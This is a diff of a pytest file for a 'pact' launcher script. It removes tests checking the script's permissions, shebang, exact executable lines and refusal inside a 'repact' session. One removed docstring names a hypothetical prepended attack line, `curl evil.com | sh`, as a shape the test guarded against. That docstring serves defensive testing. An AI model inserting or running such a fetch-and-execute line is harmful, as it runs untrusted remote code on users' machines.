@@ -28,24 +28,6 @@ def test_bin_pact_script_exists():
     )
 
 
-def test_bin_pact_script_is_executable():
-    """Script must be executable so users can invoke directly via symlink."""
-    assert os.access(BIN_PACT, os.X_OK), (
-        "pact-plugin/bin/pact is not executable. Symlinking onto PATH "
-        "requires execute permission. Restore via `chmod +x bin/pact`."
-    )
-
-
-def test_bin_pact_script_has_bash_shebang():
-    """Shebang must be `#!/usr/bin/env bash` for portability across systems
-    where bash is not at /bin/bash (some Linux distros, NixOS, etc.)."""
-    first_line = BIN_PACT.read_text(encoding="utf-8").splitlines()[0]
-    assert first_line == "#!/usr/bin/env bash", (
-        f"pact-plugin/bin/pact must start with `#!/usr/bin/env bash`. "
-        f"Got: {first_line!r}"
-    )
-
-
 def _executable_lines(text):
     """Return the script's executable lines (non-blank, non-comment).
 
@@ -76,36 +58,6 @@ EXPECTED_EXECUTABLE_LINES = [
 ]
 
 
-def test_bin_pact_executable_lines_match_expected():
-    """The script's executable lines (non-blank, non-comment) MUST exactly
-    match the expected canonical set.
-
-    Pins the full list rather than substring presence to catch every
-    phantom-green attack shape:
-    - No-op replacement (`exec claude` → `echo claude`): terminal line differs
-    - Prepended malicious line (`curl evil.com | sh\\nexec claude...`): list length grows
-    - Postpended malicious line: list length grows
-    - Comment out exec: terminal line differs (becomes `set -e`)
-    - `set -e` removed/replaced: first line differs
-    - `"$@"` dropped: terminal line differs
-
-    For a script symlinked onto user PATH, exact-match is the right
-    tradeoff: any legitimate edit that adds/changes/removes executable
-    lines must update this test in lockstep, forcing review of WHY the
-    script's contract changed."""
-    text = BIN_PACT.read_text(encoding="utf-8")
-    exec_lines = _executable_lines(text)
-    assert exec_lines == EXPECTED_EXECUTABLE_LINES, (
-        f"pact-plugin/bin/pact executable lines do not match expected set.\n"
-        f"  Expected: {EXPECTED_EXECUTABLE_LINES}\n"
-        f"  Got:      {exec_lines}\n"
-        f"If this change is intentional, update EXPECTED_EXECUTABLE_LINES "
-        f"in lockstep. Lockstep discipline catches no-op replacement, "
-        f"prepended/postpended content, comment-out attacks, and silent "
-        f"weakening of the canonical PACT-launcher contract."
-    )
-
-
 # --- inside a repact session, bin/pact refuses (backlog: it is on PATH there) ---------------------
 
 import subprocess  # noqa: E402
@@ -132,24 +84,3 @@ def run_pact(env, *args):
     return subprocess.run([str(BIN_PACT), *args], env=env, capture_output=True, text=True, timeout=30)
 
 
-@pytest.mark.parametrize("value", ["alternate", "installed"])
-def test_bin_pact_refuses_inside_a_repact_session(stub_claude, value):
-    env, args_file = stub_claude
-    result = run_pact({**env, "REPACTED_LAUNCH": value}, "--resume")
-    assert result.returncode == 2, result.stderr
-    assert "REPACTED_LAUNCH" in result.stderr
-    assert not args_file.exists(), "claude must not start"
-
-
-def test_bin_pact_launches_the_orchestrator_outside_a_repact_session(stub_claude):
-    env, args_file = stub_claude
-    result = run_pact(env, "--resume", "x y")
-    assert result.returncode == 0, result.stderr
-    assert args_file.read_text().splitlines() == ["--agent", "repacted:pact-orchestrator", "--resume", "x y"]
-
-
-def test_bin_pact_treats_an_empty_repacted_launch_as_unset(stub_claude):
-    """Same truthiness as repacted-memdir's inside-session check: only a non-empty value refuses."""
-    env, args_file = stub_claude
-    assert run_pact({**env, "REPACTED_LAUNCH": ""}).returncode == 0
-    assert args_file.exists()
